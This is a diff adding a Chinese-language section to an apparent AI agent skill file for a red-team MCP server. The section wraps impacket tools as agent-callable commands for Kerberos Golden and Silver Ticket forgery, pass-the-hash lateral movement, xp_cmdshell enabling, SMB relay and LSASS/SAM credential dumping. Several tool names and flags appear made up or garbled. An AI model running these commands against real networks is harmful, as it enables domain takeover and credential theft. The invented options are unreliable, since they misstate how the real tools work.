@@ -600,6 +600,450 @@ description: RedTeam penetration testing agent skill. Use this for network scann
 
 ---
 
+## impacket 工具包扩展
+
+### smbclient (SMB 共享访问)
+
+**MCP 工具**: `invoke_smbclient`
+
+**入口点**: `impacket-smbclient` 或 `smbclient.py`
+
+**功能**: 通过 SMB 协议连接远程共享，执行交互式命令或单条命令
+
+**参数说明**:
+
+| 参数 | 说明 |
+|------|------|
+| auth_uri | 认证信息，格式 `domain/username:password@target` |
+| share | 目标共享名称 (默认 `C$`) |
+| cmd | 要执行的 SMB 命令 (如 `ls`/`download file.txt`/`upload payload.exe`) |
+| args | 附加参数 (如 `-hashes :NTHASH`) |
+
+**使用示例**:
+
+```bash
+# 连接 SMB 共享并列出文件
+impacket-smbclient corp.local/Administrator:password@10.10.26.107 -share C$
+
+# 下载文件
+impacket-smbclient corp.local/Administrator:password@10.10.26.107 -share C$ 'get secret.txt'
+
+# 使用哈希连接
+impacket-smbclient -hashes :NTHASH corp.local/Administrator@10.10.26.107 -share C$
+```
+
+---
+
+### ticketer (Kerberos 票据伪造)
+
+**MCP 工具**: `invoke_ticketer`
+
+**入口点**: `impacket-ticketer` 或 `ticketer.py`
+
+**功能**: 伪造 Golden Ticket / Silver Ticket
+
+**参数说明**:
+
+| 参数 | 说明 |
+|------|------|
+| domain | 域名 (如 `corp.local`) |
+| user | 要伪造的用户名 |
+| hash | krbtgt 的 LMHASH:NTHASH |
+| sid | 域的 SID |
+| aes_key | AES key (可选) |
+| extra_sids | 额外 SID (如 Enterprise Admins) |
+| lifetime | 票据有效期 (默认 10 小时) |
+
+**使用示例**:
+
+```bash
+# 伪造 Administrator Golden Ticket
+impacket-ticketer -domain corp.local -domain-sid S-1-5-21-xxx Administrator -hashes :NTHASH -duration 10
+
+# 伪造服务 Silver Ticket
+impacket-ticketer -domain corp.local -domain-sid S-1-5-21-xxx -spn cifs/target.corp.local Administrator -hashes :NTHASH
+
+# 添加 Enterprise Admins 权限
+impacket-ticketer -domain corp.local -domain-sid S-1-5-21-xxx -extra-sid S-1-5-21-xxx-519 Administrator -hashes :NTHASH
+```
+
+---
+
+### psexec (服务执行横向)
+
+**MCP 工具**: `invoke_psexec_exec`
+
+**入口点**: `impacket-psexec` 或 `psexec.py`
+
+**功能**: 远程创建服务执行程序
+
+**使用示例**:
+
+```bash
+# 基本横向
+impacket-psexec corp.local/Administrator:password@10.10.26.107 cmd.exe
+
+# 使用哈希
+impacket-psexec -hashes :NTHASH corp.local/Administrator@10.10.26.107 'whoami'
+```
+
+---
+
+### smbexec (无文件横向)
+
+**MCP 工具**: `invoke_smbexec`
+
+**入口点**: `impacket-smbexec` 或 `smbexec.py`
+
+**功能**: 通过 SMB 共享执行命令，不创建服务(更隐蔽)
+
+**使用示例**:
+
+```bash
+# 执行命令
+impacket-smbexec corp.local/Administrator:password@10.10.26.107 -c 'whoami'
+
+# 无输出模式
+impacket-smbexec -hashes :NTHASH corp.local/Administrator@10.10.26.107
+```
+
+---
+
+### dcomexec (DCOM 横向)
+
+**MCP 工具**: `invoke_dcomexec`
+
+**入口点**: `impacket-dcomexec` 或 `dcomexec.py`
+
+**功能**: 通过 DCOM 接口执行命令 (绕过 SMB 限制)
+
+**使用示例**:
+
+```bash
+# 使用 MMC20 Application DCOM
+impacket-dcomexec corp.local/Administrator:password@10.10.26.107 'whoami'
+
+# 指定 ShellWindows
+impacket-dcomexec -object ShellWindows corp.local/Administrator:password@10.10.26.107
+```
+
+---
+
+### rpcdump (RPC 端点枚举)
+
+**MCP 工具**: `invoke_rpcdump`
+
+**入口点**: `impacket-rpcdump` 或 `rpcdump.py`
+
+**功能**: 枚举 RPC 端点和服务
+
+**使用示例**:
+
+```bash
+# 枚举所有 RPC 端点
+impacket-rpcdump target@192.168.1.10
+
+# 过滤特定管道
+impacket-rpcdump target@192.168.1.10 -pipes spoolss,eventlog
+```
+
+---
+
+### mssqlclient (SQL Server 连接)
+
+**MCP 工具**: `invoke_mssqlclient`
+
+**入口点**: `impacket-mssqlclient` 或 `mssqlclient.py`
+
+**功能**: 连接 MS SQL Server 执行 SQL 命令或 xp_cmdshell
+
+**使用示例**:
+
+```bash
+# 连接并执行 SQL
+impacket-mssqlclient corp.local/user:password@10.10.26.107 -db master 'SELECT @@version'
+
+# 启用 xp_cmdshell
+impacket-mssqlclient corp.local/user:password@10.10.26.107 'EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE;'
+```
+
+---
+
+### goldenPac (Golden Ticket 自动横向)
+
+**MCP 工具**: `invoke_goldenPac`
+
+**入口点**: `impacket-goldenPac` 或 `goldenPac.py`
+
+**功能**: 使用 Golden Ticket 维持目标机器访问
+
+**使用示例**:
+
+```bash
+# Golden Ticket 横向
+impacket-goldenPac corp.local/user:pass@target -dc-ip 192.168.1.10
+
+# 指定 krbtgt 哈希
+impacket-goldenPac -hashes :NTHASH corp.local/user@target -dc-ip 192.168.1.10
+```
+
+---
+
+### netview (域内主机枚举)
+
+**MCP 工具**: `invoke_netview`
+
+**入口点**: `impacket-netview` 或 `netview.py`
+
+**功能**: 枚举域内主机、共享、会话和登录用户
+
+**使用示例**:
+
+```bash
+# 获取所有会话
+impacket-netview corp.local/Administrator:password -target-file targets.txt -show-sessions
+
+# 获取登录用户
+impacket-netview -hashes :NTHASH corp.local/Administrator@dc -show-loggedin
+```
+
+---
+
+### lookupsid (SID 枚举)
+
+**MCP 工具**: `invoke_lookupsid`
+
+**入口点**: `impacket-lookupsid` 或 `lookupsid.py`
+
+**功能**: 通过 LSARPC 枚举域用户 SID
+
+**使用示例**:
+
+```bash
+# 枚举用户 SID
+impacket-lookupsid corp.local/Administrator:password@192.168.1.10
+
+# 匿名枚举
+impacket-lookupsid target@192.168.1.10 -domain corp.local
+```
+
+---
+
+### ldapsearch (LDAP 查询)
+
+**MCP 工具**: `invoke_ldapsearch`
+
+**入口点**: `impacket-ldapsearch` 或 `ldapsearch.py`
+
+**功能**: 查询 LDAP 目录获取域信息
+
+**使用示例**:
+
+```bash
+# 枚举所有用户
+impacket-ldapsearch corp.local/user:pass -dc-hosts=192.168.1.10 -query "(objectClass=user)"
+
+# 查找域管
+impacket-ldapsearch corp.local/user:pass -dc-hosts=192.168.1.10 -query "(memberOf=*Domain Admins*)"
+```
+
+---
+
+### services (Windows 服务管理)
+
+**MCP 工具**: `invoke_services`
+
+**入口点**: `impacket-services` 或 `services.py`
+
+**功能**: 枚举、启动、停止、创建 Windows 服务
+
+**使用示例**:
+
+```bash
+# 查询服务
+impacket-services corp.local/Administrator:password@target -action query
+
+# 启动服务
+impacket-services -hashes :NTHASH corp.local/Administrator@target -action start -service-name VulnService
+```
+
+---
+
+### nfs_mount (NFS 挂载)
+
+**MCP 工具**: `invoke_nfs_mount`
+
+**入口点**: `impacket-nfs_mount` 或 `nfs_mount.py`
+
+**功能**: 挂载远程 NFS 共享
+
+**使用示例**:
+
+```bash
+# 挂载 NFS 共享
+impacket-nfs_mount 192.168.1.100 -mount=/share
+
+# 指定挂载点
+impacket-nfs_mount 192.168.1.100 -o mount=/share,dest=/mnt/nfs
+```
+
+---
+
+### sniffer (网络流量嗅探)
+
+**MCP 工具**: `invoke_sniff`
+
+**入口点**: `impacket-sniffer` 或 `sniffer.py`
+
+**功能**: 抓包分析网络流量
+
+**使用示例**:
+
+```bash
+# 抓取流量
+impacket-sniffer -i eth0 -c 100 -o capture.pcap
+
+# 过滤特定流量
+impacket-sniffer -i eth0 -filter "tcp port 445" -o capture.pcap
+```
+
+---
+
+### smbrelayx (SMB 中继)
+
+**MCP 工具**: `invoke_smbrelayx`
+
+**入口点**: `impacket-smbrelayx` 或 `smbrelayx.py`
+
+**功能**: SMB 中继攻击
+
+**使用示例**:
+
+```bash
+# 监听并中继
+impacket-smbrelayx -t smb://target -mode server -e "whoami"
+
+# 指定目标列表
+impacket-smbrelayx -tf targets.txt --smb2support
+```
+
+---
+
+### mimikatz (凭据提取)
+
+**MCP 工具**: `invoke_mimikatz`
+
+**入口点**: `impacket-mimikatz` 或 `mimikatz.py`
+
+**功能**: LSASS/SAM 凭据提取
+
+**使用示例**:
+
+```bash
+# 导出所有凭据
+impacket-mimikatz corp.local/Administrator:password@target -dump all
+
+# 只导出 sekurlsa
+impacket-mimikatz -hashes :NTHASH corp.local/Administrator@target -dump sekurlsa
+```
+
+---
+
+### kintercept (Kerberos 票据操作)
+
+**MCP 工具**: `invoke_kintercept`
+
+**入口点**: `impacket-kintercept` 或 `kintercept.py`
+
+**功能**: Kerberos 票据枚举和操作
+
+**使用示例**:
+
+```bash
+# 读取票据
+impacket-kintercept target@corp.local -mode read
+
+# 请求票据
+impacket-kintercept corp.local/user:pass@target -mode request -query cifs/
+```
+
+---
+
+### opdump (RPC 协议绑定)
+
+**MCP 工具**: `invoke_opdump`
+
+**入口点**: `impacket-opdump` 或 `opdump.py`
+
+**功能**: 绑定 RPC 协议端点进行探测
+
+**使用示例**:
+
+```bash
+# 基本探测
+impacket-opdump 192.168.1.10
+
+# 指定协议
+impacket-opdump 192.168.1.10 -protocol ldap
+```
+
+---
+
+### registry_read (注册表读取)
+
+**MCP 工具**: `invoke_registry_read`
+
+**入口点**: `impacket-registry_read` 或 `registry_read.py`
+
+**功能**: 读取远程注册表
+
+**使用示例**:
+
+```bash
+# 读取服务列表
+impacket-registry_read corp.local/Administrator:password@target -HiveName HKLM -SubKey 'SYSTEM\\CurrentControlSet\\Services'
+```
+
+---
+
+### esentutl (ESE 数据库解析)
+
+**MCP 工具**: `invoke_esentutlparse`
+
+**入口点**: `impacket-esentutl` 或 `esentutl.py`
+
+**功能**: 解析 ESE 数据库 (Exchange/DHCP/索引)
+
+**使用示例**:
+
+```bash
+# 解析数据库
+impacket-esentutl database.edb -o output_dir
+```
+
+---
+
+### 通用 impacket 执行
+
+**MCP 工具**: `invoke_misc`
+
+**功能**: 执行未单独封装的 impacket 工具
+
+**使用示例**:
+
+```bash
+# 执行 karmaSMB
+invoke_misc(command_name="karmaSMB", args_str="target@192.168.1.10")
+
+# 执行 getArch
+invoke_misc(command_name="getArch", args_str="-target 192.168.1.10")
+
+# 执行 ntfs-read
+invoke_misc(command_name="ntfs-read", args_str="-path \\\\target\\share\\file.ntfs")
+```
+
+---
+
 ## 工具九：BloodHound 数据分析 (AD 权限图谱分析器)
 
 **脚本路径**: d:\mcp\redteam-server\bloodhound_analysis.py
